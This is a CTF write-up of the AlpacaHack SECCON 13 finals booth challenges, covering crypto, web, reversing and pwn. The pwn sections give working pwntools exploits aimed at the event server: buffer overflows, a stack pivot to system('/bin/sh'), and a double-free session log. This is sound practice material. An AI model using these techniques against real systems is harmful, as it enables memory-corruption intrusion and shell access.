# AlpacaHack seccon-13-finals-booth Writeup
[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges)

* preface
  * 最速で15冠しTシャツをもらいました
![Screenshot_20250303_215715.png](Screenshot_20250303_215715.png)

![IMG_20250302_163000.jpg](IMG_20250302_163000.jpg)


## Welcome
<primary-label ref="misc"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/welcome-to-seccon-13-finals-booth)
* solution
  * read the description

## Long Flag
<primary-label ref="cry"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/long-flag)

* solution
  * use `long_to_bytes`
```py
from Crypto.Util.number import long_to_bytes

print(long_to_bytes(35774448546064092714087589436978998345509619953776036875880600864948129648958547184607421789929097085))
```

## cookie
<primary-label ref="web"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/cookie)
* solution
  * request with cookie: `admin=true`

## Beginner's Flag Printer
<primary-label ref="rev"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/beginners-flag-printer)
* the assembly means 
```
printf("%x",539232261)
```
[](https://wiki.osdev.org/System_V_ABI#:~:text=view%3Dmsvc%2D170-,x86%2D64,-This%20is%20a)

```js
// solver.js
function findPair() {
  for (let exp = 20; exp <= 22; exp++) {
    for (let m1 = -9; m1 <= -1; m1++) {
      for (let m2 = -9; m2 <= -1; m2++) {
        let a = m1 * Math.pow(10, exp);
        let b = m2 * Math.pow(10, exp - 1);
        if (a < b && parseInt(a) > parseInt(b)) {
          return { a, b };
        }
      }
    }
  }
  return null;
}

const pair = findPair();
if (pair) {
  console.log("Found valid pair:");
  console.log("a =", pair.a);
  console.log("b =", pair.b);
  console.log("a.toString() =", pair.a.toString());
  console.log("b.toString() =", pair.b.toString());
  console.log("parseInt(a) =", parseInt(pair.a));
  console.log("parseInt(b) =", parseInt(pair.b));
} else {
  console.log("No valid pair found.");
}
```

## trippple
<primary-label ref="cry"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/trippple)

```py
from Crypto.Util.number import long_to_bytes, inverse

n = 272361880253535445317143279209232620259509770172080133049487958853930525983846305005657
c = 69147423377323669983172806367084358432369489877851180970277804462365354019444586165184
e = 65537

def integer_cube_root(n):
    lo, hi = 0, n
    while lo <= hi:
        mid = (lo + hi) // 2
        cube = mid * mid * mid
        if cube == n:
            return mid
        elif cube < n:
            lo = mid + 1
        else:
            hi = mid - 1
    return hi

p = integer_cube_root(n)
assert p**3 == n, "n is not a perfect cube!"

print(f"Found p: {p}")

phi_n = p * p * (p - 1)

d = inverse(e, phi_n)

m = pow(c, d, n)

flag = long_to_bytes(m)
print("FLAG:", flag.decode())
```

## danger of buffer overflow
<primary-label ref="pwn"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/danger-of-buffer-overflow)

* solution
  * buffer overflow vulnerability
  * rewrite a function pointer
```py
from pwn import *
import sys

e = ELF("buffer-overflow",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 24310"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

ru(b"address of print_flag func: ")
print_flag = int(rl().strip(),16) 

paybyte(b"A"*0x8)
add64(print_flag)

sl(payload)

shell()
```

## play with memory
<primary-label ref="pwn"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/play-with-memory)

```c
  scanf("%4s", &number);

  if (number == 12345) {
    print_flag();
  }
```


```py
from pwn import *
import sys

e = ELF("memory",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 57944"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    b *main+86
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

sl(b"\x39\x30\x00\x00")

shell()
```

## 42
<primary-label ref="cry"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/42)

```py
from Crypto.Util.number import long_to_bytes

res = [3 ,23 ,2205496470181 ,2219555763769 ,2233425033163 ,2239061295271 ,2259023796727 ,2284404776567 ,2291370145123 ,2416633488457 ,2419508288471 ,2434758174067 ,2500841090549 ,2503738093453 ,2573045476847 ,2680923822481 ,2778916602433 ,2788061078027 ,2796482148853 ,2874516939989 ,3132015040537 ,3139228584347 ,3155640636023 ,3194390562137 ,3284689931333 ,3395646793247 ,3450918694961 ,3542857468897 ,3558548169959 ,3723346041941 ,3734921299007 ,3741754738429 ,3881331302137 ,3955397572079 ,3975840251293 ,4072584462841 ,4130457980197 ,4158189715259 ,4194605058227 ,4207350753019 ,4244137496801 ,4299476105167 ,4327600625807 ,4333485694679 ,64527453873583290390233 ,360296424708927327075211324489217]


flag = 1

for r in res:
    if r.bit_length() != 42:
        flag *= r

print(long_to_bytes(flag))
```

## FlagPrinter
<primary-label ref="rev"/>

* solution
  * fix assembly into nasm rule.

```nasm
BITS 64

global main
extern printf

section .rodata
LC0:
    db "Alpaca{%s}", 10, 0

section .text

f:
    push    rbp
    mov     rbp, rsp
    mov     qword [rbp-24], rdi
    mov     dword [rbp-4], 0
    jmp     .L2
.L4:
    mov     eax, dword [rbp-4]
    movsx   rdx, eax
    mov     rax, qword [rbp-24]
    add     rax, rdx
    movzx   eax, byte [rax]
    cmp     al, 64
    jle     .L3
    mov     eax, dword [rbp-4]
    movsx   rdx, eax
    mov     rax, qword [rbp-24]
    add     rax, rdx
    movzx   eax, byte [rax]
    cmp     al, 90
    jg      .L3
    mov     eax, dword [rbp-4]
    movsx   rdx, eax
    mov     rax, qword [rbp-24]
    add     rax, rdx
    movzx   eax, byte [rax]
    movsx   eax, al
    lea     edx, [rax-65]
    mov     eax, dword [rbp-4]
    add     eax, 13
    add     eax, edx
    movsx   rdx, eax
    imul    rdx, rdx, 1321528399
    shr     rdx, 32
    sar     edx, 3
    mov     ecx, eax
    sar     ecx, 31
    sub     edx, ecx
    imul    ecx, edx, 26
    sub     eax, ecx
    mov     edx, eax
    mov     eax, edx
    lea     ecx, [rax+65]
    mov     eax, dword [rbp-4]
    movsx   rdx, eax
    mov     rax, qword [rbp-24]
    add     rax, rdx
    mov     edx, ecx
    mov     byte [rax], dl
.L3:
    add     dword [rbp-4], 1
.L2:
    mov     eax, dword [rbp-4]
    movsx   rdx, eax
    mov     rax, qword [rbp-24]
    add     rax, rdx
    movzx   eax, byte [rax]
    test    al, al
    jne     .L4
    nop
    nop
    pop     rbp
    ret

main:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 16
    mov     dword [rbp-7], 1197424961
    mov     dword [rbp-4], 4672071
    lea     rax, [rbp-7]
    mov     rdi, rax
    call    f
    lea     rax, [rbp-7]
    mov     rsi, rax
    mov     rdi, LC0
    xor     eax, eax
    call    printf
    xor     eax, eax
    leave
    ret
```

```sh
nasm -f elf64 tmp.asm -o challenge.o
```

## Can U Keep A Secret?
<primary-label ref="pwn"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/can-u-keep-a-secret)

* I checked the disassembly then I noticed that second `rand()` were disappeared.

![Screenshot_20250303_223802.png](Screenshot_20250303_223802.png)

## cache crasher
<primary-label ref="pwn"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/cache-crasher)

* solution
  * double free -> type confusion
```sh
[~] >>>nc 34.170.146.252 45969
address of print_flag: 0x40222e
address of funcptr: 0x405150
opcode(0: alloc, 1: free): 0
data(integer): 0
content of funcptr: 0x4022a2
Cache:
(nil)
Buffer:
buf[0]: 0x4051a0 (val: 0x0)
opcode(0: alloc, 1: free): 1
what index to free: 0
content of funcptr: 0x4022a2
Cache:
0x4051a0 -> (nil)
Buffer:
buf[0]: 0x4051a0 (val: 0x0)
opcode(0: alloc, 1: free): 1
what index to free: 0
content of funcptr: 0x4022a2
Cache:
0x4051a0 -> 0x4051a0 -> 0x4051a0 -> 0x4051a0 -> 0x4051a0 -> ...
Buffer:
buf[0]: 0x4051a0 (val: 0x4051a0)
opcode(0: alloc, 1: free): 0
data(integer): 4215120
content of funcptr: 0x4022a2
Cache:
0x4051a0 -> 0x405150
Buffer:
buf[0]: 0x4051a0 (val: 0x405150)
opcode(0: alloc, 1: free): 0
data(integer): 4203054
content of funcptr: 0x4022a2
Cache:
0x405150
Buffer:
buf[0]: 0x4051a0 (val: 0x40222e)
opcode(0: alloc, 1: free): 0
data(integer): 4203054
content of funcptr: 0x40222e
Alpaca{***REDACTED***}
opcode(0: alloc, 1: free): ^C
```

## Slow Flag Printer
<primary-label ref="rev"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/slow-flag-printer)

* solution
  * reverse...reverse...

```cpp
#include <iostream>
#include <vector>
#include <cstdlib>
#include <chrono>
#include <thread>
#include <string>

using namespace std;
using namespace std::chrono;

int main() {
    srand(0xDEADBEEF);

    string secretStr = "@msgmsm\021\021\027Xb\177\061z\f~~Qv\025RzvuZy\002w\025kNH[4H\r^\026\020PP\345\367\377\177";
    const int vecSize = 42;
    vector<char> vec(vecSize);
    for (int i = 0; i < vecSize; i++) {
        vec[i] = secretStr[i % secretStr.size()];
    }

    cout << "flag: " << flush;

    auto prevTime = system_clock::now();

    long long v14 = 1;

    for (int i = 0; i < vecSize; ++i) {
        int sleepSeconds = rand() % v14 + 1;

        long long elapsedMillis = static_cast<long long>(sleepSeconds) * 1000;

        int mask = ((elapsedMillis + 100) / 1000) % 128;

        char outChar = vec[i] ^ mask;
        cout << outChar << flush;

        v14 *= 2;

        prevTime += seconds(sleepSeconds);
    }
    cout << endl;

    return 0;
}
```

## Alpaca Wakekko
<primary-label ref="pwn"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/alpaca-wakekko)

* solution
  * buffer overflow vulnerability
  * stack pivot into writable section -> ret2system

```py
from pwn import *
import sys

e = ELF("challenge",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 18911"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

writable = 0x0000000000404a00
alpaca = 0x0402004


paybyte(b"alpaca")
payload = payload.ljust(0x18,b"\0")
add64(alpaca)
add64(alpaca)
add64(writable)
add64(writable)
#add64(e.plt["system"])
add64(0x4012da) #gets() @ wakekko

sl(payload)

paybyte(b"/bin/sh\0")
payload = payload.ljust(0x18,b"\0")
add64(writable-0x30)
add64(writable-0x30)
add64(writable-0x40)
add64(writable-0x40)
add64(0x0401315) #system() @ wakekko

sl(payload)

print(r())

shell()
```

## Concurrent Flag Printer
<primary-label ref="rev"/>

[](https://alpacahack.com/ctfs/seccon-13-finals-booth/challenges/concurrent-flag-printer)

* rust:cry:
* 4 threads launched in this challenge.
* 4 threads construct the string in parallel, break at `std::thread::Builder::spawn_unchecked::hc4b5f0da48ddb8b5` with following script with gdb.

```sh
set mi-async on
set non-stop on
```

![Screenshot_20250303_230516.png](Screenshot_20250303_230516.png)

